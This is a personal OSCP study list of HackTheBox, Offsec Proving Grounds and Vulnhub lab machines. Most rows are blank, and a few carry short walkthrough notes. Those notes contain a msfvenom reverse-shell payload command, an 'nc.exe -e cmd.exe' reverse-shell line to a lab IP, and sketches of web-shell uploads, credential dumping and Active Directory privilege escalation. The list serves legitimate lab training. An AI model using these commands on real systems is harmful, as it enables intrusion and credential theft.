- Resource [List](https://docs.google.com/spreadsheets/u/1/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/htmlview#)
- List Prepared on 10/18/2024, soon will add one by one walkthroughs
# HackTheBox
## HackTheBox - Windows Active Directory
| Name | Level | Description|
|:-|:-|:-|
|Active | | |
|Forest | | |
|Sauna | | |
|Monteverde | | |
|Timelapse | | |
|Return | | |
|Cascade | | |
|Flight | | |
|Blackfield | | |

## HackTheBox - Windows
| Name | Level | Description|
|:-|:-|:-|
|Escape | | |
|Servmon | | |
|Support | | |
|StreamIO | | |
|Blackfield | | |
| Intelligence| | |
|Jeeves| | |
|Manager | | |
|Access | | |
|Aero | | |
|Mailing| | |

## HackTheBox Linux
| Name | Level | Description|
|:-|:-|:-|
|Busqueda | | |
|UpDown | | |
|Sau | | |
|Help | | |
|Broker | | |
|Intentions | | |
|Soccer | | |
|Keeper | | |
|Monitored | | |
|BoardLight | | |
|Networked | | |
|CozyHosting | | |
|Editorial | | |
|Help | | |
|Magic | | |
|Pandora | | |
|Builder | | |
|Usage | | |
|[Chaos](https://ashokreddyz.medium.com/chaos-hackthebox-firefox-password-decrypt-5906671dd8d3)|Medium|credential reuse, and WordPress directory identification, Firefox credentials decrypt|



# Offsec Proving Ground Practice

## Offsec Proving Ground Practice - Windows Active Directory
| Name | Level | Description|
|:-|:-|:-|
|Access | | |
|Heist | | |
|Vault | | |
|Nagoya | | |
|Hokkaido | | |
|Resourced | | |

## Offsec Proving Ground Practice - Windows
| Name | Level | Description|
|:-|:-|:-|
|Helpdesk | |Machine not available at this time 10/19/2024 |
|[Algernon](https://ashokreddyz.medium.com/algernon-proving-ground-practic-esmartermail-cve-2019-7214-windows-5c5cb6083fba) |Easy |FTP anonymous login is allowed to download all files from it, SmarterMail(CVE-2019–7214), Remote Code Execution. |
|Authby |Medium |Intiall got access to ftp anonymous the find the usernames, then with admin:admin got FTP aceess able see the .htpasswd through web shell Simple-Backdoor.php, then escalate privileges using wes kernel exploits [40564](https://www.exploit-db.com/exploits/40564) [walkthrough](https://www.youtube.com/watch?v=U-VLgIDlySA&t), Learning ftp shell hash linux kind of permissions observe carefully for file names as well, think of web access through admin access to upload file and through web shell get shell back, through curl and while execute commands |
|Craft | Intermediate|This port 80 with web shell, can upload .odt file extension which is libreoffice macro file, created macro powershell TCP one liner script then got access to low levl user, then vertically escalate apache user in xmapp folder uploaded php cmd liner, this user has SeImpersanate privileges, using the PrintSpoofer64 and powershell got access to NT Authority user |
|Craft2 |Hard |through Port 80 only accept the .odt(LibreOffice) file, using [badodt](https://github.com/rmdavy/badodf/tree/master) script and responder got thecybergeek user hash using that login into smbclient shell uploaded php revshell, with apache user, using runas as command got thecybergeek shell, in that privesc xampp has password.txt mysql running is root privileges, through write file permissions and [WerTrigger](https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation/#exploit_1) got administrator access. [youtube](https://www.youtube.com/watch?v=-Y4yrwNx8ww&pp=ygUNY3JhZnQyIG9mZnNlYw%3D%3D) |
|Hutch | Intermediate|Mutiple ports are open using ldapsearch found user credentials through that loggin to webdav is their through that cadaver tool login uploaded cmdaspx.aspx, then printSpoofer got administrator access, other way using initial crdes ran bloodhound-python got architecture of AD the user has laps <b>ReadLAPSPassword, ms-Mcs-AdmPwd</b> password got admin creds login as admin [walkthrough](https://juggernaut-sec.com/proving-grounds-hutch/)|
|Internal |Easy | System running on windows server 2008 using smb port exploit tried with metasploit and and no luck ms09-050, after reverting also no response moving next one [blue](https://www.trenchesofit.com/2020/11/24/offensive-security-proving-grounds-internal-write-up-no-metasploit)
[ms09-050](https://pentesting.zeyu2001.com/proving-grounds/warm-up/internal)|
|Jacko |Intermediate |In the ports 80 running the H2 database, it redirects to port 8082 initially no accessabl revert then accessible their is login without password, their is version using exploitDB script, loggedin using the nc or Metasploit non-staged payload, their running PaperSteam IP, identified the version then find the exploit in exploitDB got the shell using powershell bypass worked first first time time ```powershell.exe -ep bypass exploit.ps1```used S1ren video  |
|Kevin |Easy | Identified some ports no information with smb, nbtstart and port 80 running the GOAhead WebServer, with HP power manager, exploitdb 10099.py replaced the buffer with  msfvenom payload ``` msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.227 LPORT=80 -f c -b "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x3d\x3b\x2d\x2c\x2e\x24\x25\x1a" -e x86/alpha_mixed``` got admin access|
|Resourced |Intermediate |Some ports are open using enum4linux and rpcclient(querydispinfo) got user credentials from the description,using that credentials login into smbclient hash 'Password Aduit' folder, using impacket-smbclient tool logged into tools it has SYSTEM and ntds.dit, using this file dump the credentils, using user and NTLM hash spray the credentials with crackmapexec for winrm for with with user, logged in, using bloodhound-python generated .json files, uploaded into bloodhound tool, The user we oned mark as owned the goto -> Node Info -> OUTBOUND OBJECT CONTROL their -> <b>First Degree Object Control</b> theis Generic All permission <b>esource based constrained delegation attack.</b> [Notes](https://github.com/ashok5141/OSCP/blob/main/OSCP%20Commands.md#generic-all-permission-in-active-directory)|
|Squid |Easy |The port running squid proxy on port 3128, using [spose](https://github.com/aancw/spose) found the open ports then using froxyproxy access the port 8080 phpmyadmin created shell with php cmd backdoor RCE through with revshell powershell#3 urlencode got shell, local flag is in the C drive |
|DVR4 |Intermediate |Intial port 8080 not showed in the nmap, showed port 22 Bitvis winssh 8.48, then restart the machine again nmap found port 8080 <b>Argus Surveillance DVR</b> Search in the exploitdb, Directory Traversal(45296), found the ssh key the windows ssh key location ```C:\Users\your_username\.ssh\id_rsa```  also found the weak password(50130) their is path of the password location tried with that but no password is revealed, search with the title with github found [link](https://github.com/s3l33/CVE-2022-25012/blob/main/CVE-2022-25012.py) decrypted password, tried ssh but not working then identified the user folder has nc.exe and psexec.exe using run as command ```runas /user:Administrator "nc.exe -e cmd.exe 192.168.45.214 445"``` logged in as administrator |
|Hepet | | |
|Shenzi | | |
|Nickel | | |
|Slort | | |



## Offsec Proving Ground Practice - Linux
| Name | Level | Description|
|:-|:-|:-|
|[Hetemit](https://medium.com/@c00540105/hetemit-proving-grounds-practice-a9d8dc95afd5) |Intermediate | Takeouts from this article give insights into Python code, vulnerable API design done by developers, enumeration of curl command, and Python OS module. Link|
|Twiggy | | |
|Exfiltrated | | |
|Pelican | | |
|Astronaut | | |
|Blackgate | | |
|Boolean | | |
|Clue | | |
|Cockpit | | |
|Codo | | |
|Crane | | |
|Levram | | |
|Extplorer | | |
|Hub | | |
|Image | | |
|Lav | | |
|Lavita | | |
|PC | | |
|Fired | | |
|Press | | |
|Scrutiny | | |
|RubyDome | | |
|Zipper | | |
|Flu | | |
|Ochima | | |
|PyLoader | | |
|Plum | | |



# Offsec Proving Ground Play

## Offsec Proving Ground Play - Linux
| Name | Level | Description|
|:-|:-|:-|
|eLection | | |
|Stapler | | |
|Monitoring  | |
|InsanityHosting | | |
|DriftingBlue6 | | |
|Loly | | |
|Blogger | | |
|Amaterasu | | |
|Blogger | | |
|Potato | | |
|DC-9	| | |




# Vulnhub
| Name |  Description|
|:-|:-|
|[DC 9](https://www.vulnhub.com/entry/dc-9,412/) | | 
|[Digitalworld.local (Bravery)](https://www.vulnhub.com/entry/digitalworldlocal-bravery,281/) | | 
|[Digitalworld.local (Development)](https://www.vulnhub.com/entry/digitalworldlocal-development,280/) | | 
|[Digitalworld.local (Mercy v2)](https://www.vulnhub.com/entry/digitalworldlocal-mercy-v2,263/) | | 
|[Digitalworld.local (JOY)](https://www.vulnhub.com/entry/digitalworldlocal-joy,298/) | | 
|[Digitalword.local (FALL)](https://www.vulnhub.com/entry/digitalworldlocal-fall,726/) | | 
|[Prime 1](https://www.vulnhub.com/entry/prime-1,358/) | | 
|[Misdirection 1](https://www.vulnhub.com/entry/misdirection-1,371/) | | 
|[Sar 1](https://www.vulnhub.com/entry/sar-1,425/) | | 
|[Djinn 1](https://www.vulnhub.com/entry/djinn-1,397/) | | 
|[EVM 1](https://www.vulnhub.com/entry/evm-1,391/) | | 
|[DerpNStink 1](https://www.vulnhub.com/entry/derpnstink-1,221/) | | 
|[RickdiculouslyEasy 1](https://www.vulnhub.com/entry/rickdiculouslyeasy-1,207/) | | 
|[Tommy Boy 1](https://www.vulnhub.com/entry/tommy-boy-1,157/) | | 
|[Breach 1](https://www.vulnhub.com/entry/breach-1,152/) | | 
|[Breach 2.1](https://www.vulnhub.com/entry/breach-21,159/) | | 
|[Breach 3.0.1](https://www.vulnhub.com/entry/breach-301,177/) | | 
|[NullByte](https://www.vulnhub.com/entry/nullbyte-1,126/) | | 
|[Bob 1.0.1](https://www.vulnhub.com/entry/bob-101,226/) | | 
|[Toppo 1](https://www.vulnhub.com/entry/toppo-1,245/) | | 
|[W34kn3ss 1](https://www.vulnhub.com/entry/w34kn3ss-1,270/) | | 
|[GoldenEye 1](https://www.vulnhub.com/entry/goldeneye-1,240/) | | 
|[Infosec Prep OSCP Box](https://www.vulnhub.com/entry/infosec-prep-oscp,508/) | | 
|[LemonSqueezy](https://www.vulnhub.com/entry/lemonsqueezy-1,473/) | | 
|[Brainpan 1](https://www.vulnhub.com/entry/brainpan-1,51/) | | 
|[Lord of the root 1.0.1](https://www.vulnhub.com/entry/lord-of-the-root-101,129/) | | 
|[Tiki-10](https://www.vulnhub.com/entry/tiki-1,525/) | | 
|[Healthcare 1](https://www.vulnhub.com/entry/healthcare-1,522/) | | 
|[Photographer 1](https://www.vulnhub.com/entry/photographer-1,519/) | | 
|[Glasglow 1.1](https://www.vulnhub.com/entry/glasgow-smile-11,491/) | | 
|[DevGuru 1](https://www.vulnhub.com/entry/devguru-1,620/) | | 
|[Alpha 1](https://www.vulnhub.com/entry/alfa-1,655/) | | 
|[Hack Me Please](https://www.vulnhub.com/entry/hack-me-please-1,731/) | | 
|[IMF](https://www.vulnhub.com/entry/imf-1,162/) | | 
|[Tommy Boy](https://www.vulnhub.com/entry/tommy-boy-1,157/) | | 
|[Billy Madison](https://www.vulnhub.com/entry/billy-madison-11,161/) | | 
|[Tr0ll1](https://www.vulnhub.com/entry/tr0ll-1,100/) | | 
|[Tr0ll2](https://www.vulnhub.com/entry/tr0ll-2,107/) | | 
|[Wallaby's Nightmare](https://www.vulnhub.com/entry/wallabys-nightmare-v102,176/) | | 
|[Moria](https://www.vulnhub.com/entry/moria-1,187/) | | 
|[BSides Vancouver 2018](https://www.vulnhub.com/entry/bsides-vancouver-2018-workshop,231/) | | 
|[DEFCON Toronto Galahad](https://www.vulnhub.com/entry/defcon-toronto-galahad,194/) | | 
|[Spydersec](https://www.vulnhub.com/entry/spydersec-challenge,128/) | | 
|[Pinkys Palace v3](https://www.vulnhub.com/entry/pinkys-palace-v3,237/) | | 
|[Pinkys Palace v4](https://www.vulnhub.com/entry/pinkys-palace-v4,265/) | | 
|[Vulnerable Docker 1](https://www.vulnhub.com/entry/vulnerable-docker-1,208/) | | 
|[Node 1](https://www.vulnhub.com/entry/node-1,252/) | | 
|[Troll 3:](https://www.vulnhub.com/entry/tr0ll-3,340/) | | 
|[Readme 1](https://www.vulnhub.com/entry/readme-1,336/) | | 
|[OZ](https://www.vulnhub.com/entry/oz-1,317/) | | 
|[Metasploitable 3](https://github.com/rapid7/metasploitable3) | |
|[Election 1](https://www.vulnhub.com/entry/election-1,503/) | | 
|[Pinkys Palace v1](https://www.vulnhub.com/entry/pinkys-palace-v1,225/) | |
|[Hacker Kid: 1.0.1](https://www.vulnhub.com/entry/hacker-kid-101,719/) | | 


# Other Resource
| Name | Links |
|:-|:-|
|GOAD |[Link](https://github.com/Orange-Cyberdefense/GOAD/tree/main) | 
|VulnAD |[Link](https://github.com/tjnull/OSCP-Stuff/tree/master/Active-Directory) | 
|Ludus |[Link](https://gitlab.com/badsectorlabs/ludus) | 
